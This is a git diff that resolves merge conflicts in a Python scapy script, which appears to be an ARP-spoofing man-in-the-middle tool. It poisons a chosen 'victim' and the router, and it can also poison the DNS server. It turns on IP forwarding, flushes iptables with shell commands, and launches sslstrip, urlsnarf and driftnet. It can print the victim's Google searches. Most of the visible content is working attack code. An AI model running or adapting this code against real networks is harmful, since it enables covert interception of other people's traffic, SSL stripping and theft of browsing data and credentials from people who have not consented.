@@ -4,7 +4,6 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
-<<<<<<< HEAD
 #Below is necessary to receive a response to the DHCP packets for some reason
 conf.checkIPaddr=0
 import time
@@ -29,22 +28,6 @@ parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and s
 parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet", action="store_true")
 parser.add_argument("-g", "--google", help="Print google searches", action="store_true")
 parser.add_argument("-s", "--sslstrip", help="Run sslstrip and output to sslstrip.txt", action="store_true")
-=======
-import time, sys
-import threading
-import argparse
-import sys
-import signal
-import argparse
-import commands
-bash=commands.getoutput
-
-
-parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--urlsnarf", help="Run with urlsnarf in output", action="store_true")
-parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim")
-parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet", action="store_true")
->>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
 args = parser.parse_args()
 
 #Find the gateway and use it as the router's info
@@ -53,7 +36,6 @@ routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w
 routerIP = routerRE.group(1)
 IPprefix = routerRE.group(2)
 interface = routerRE.group(3)
-<<<<<<< HEAD
 
 if args.dnsspy:
 	print "Checking if the router is the DNS server..."
@@ -78,23 +60,6 @@ else:
 def originalMAC(ip):
 	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
 	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=7, retry=3)
-=======
-driftcounter = 0
-
-class ThreadClass(threading.Thread):
-	def run(self):
-		process = subprocess.Popen(['urlsnarf', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		while True:
-			out = process.stdout.read(1)
-			if out == '' and process.poll() != None:
-				break
-			if out != '':
-				sys.stdout.write(out)
-				sys.stdout.flush()
-
-def originalMAC(ip):
-	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5)
->>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
 	for s,r in ans:
 		return r.sprintf("%Ether.src%")
 
@@ -106,7 +71,6 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
 	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5)
 	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5)
 
-<<<<<<< HEAD
 def URL(pkt):
 	if pkt.haslayer(Raw):
 		request = pkt[Raw].load
@@ -157,32 +121,6 @@ def main():
 	ipNATF = bash('iptables -t nat F')
 	ipX = bash('iptables -X')
 	ipNATX = bash('iptables -t nat -X')
-=======
-if args.ipaddress:
-	victimIP = args.ipaddress
-else:
-	ans,unans = arping(IPprefix+'*')
-	for s,r in ans:
-		ips = r.sprintf("%ARP.psrc%")
-		print ips
-	victimIP = raw_input('\nType victim\'s IP: ')
-
-
-def main():
-
-	def signal_handler(signal, frame):
-		print ' ...  Sending healing packets and turning off IP forwarding ...'
-		restore(routerIP, victimIP, routerMAC, victimMAC)
-		restore(routerIP, victimIP, routerMAC, victimMAC)
-		ipforwardoff = bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
-		sys.exit(0)
-
-	signal.signal(signal.SIGINT, signal_handler)
-
-	#Forward packets and flush iptables
-	ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
-	bash('iptables --flush')
->>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
 	print 'Enabled IP forwarding and flushed the firewall\n'
 
 	print "Active interface = " + interface
@@ -195,7 +133,6 @@ def main():
 		victimMAC = originalMAC(victimIP)
 		print "Victim MAC: " + victimMAC + "\n"
 	except:
-<<<<<<< HEAD
 		sys.exit("Could not get MAC addresses")
 
 	if args.urlspy or args.google:
@@ -226,37 +163,10 @@ def main():
 
 	signal.signal(signal.SIGINT, signal_handler)
 
-=======
-		try:
-			print "Didn't recieve a reply; trying again..."
-			routerMAC = originalMAC(routerIP)
-			print "Router MAC: " + routerMAC
-			victimMAC = originalMAC(victimIP)
-			print "Victim MAC: " + victimMAC + "\n"
-		except:
-			try:
-				print "Didn't recieve a reply; trying again..."
-				routerMAC = originalMAC(routerIP)
-				print "Router MAC: " + routerMAC
-				victimMAC = originalMAC(victimIP)
-				print "Victim MAC: " + victimMAC + "\n"
-			except:
-				sys.exit("Could not get MAC addresses")
-
-	if args.urlsnarf:
-		time.sleep(10)
-		t=ThreadClass()
-		t.start()
-
-	if args.driftnet:
-		time.sleep(10)
-		driftnet = bash('xterm -e driftnet -i %s ' % interface)
->>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
 
 	while 1:
 
 		poison(routerIP, victimIP)
-<<<<<<< HEAD
 		try:
 			if DNSserver != routerIP:
 				poison(DNSserver, victimIP)
@@ -264,13 +174,6 @@ def main():
 			pass
 		time.sleep(4)
 
-=======
-		if driftcounter < 1:
-			if args.driftnet:
-				driftnet = bash('xterm -e driftnet -i %s ' % interface)
-				driftcounter = 1
-		time.sleep(2)
->>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
 
 if __name__ == "__main__":
 	main()
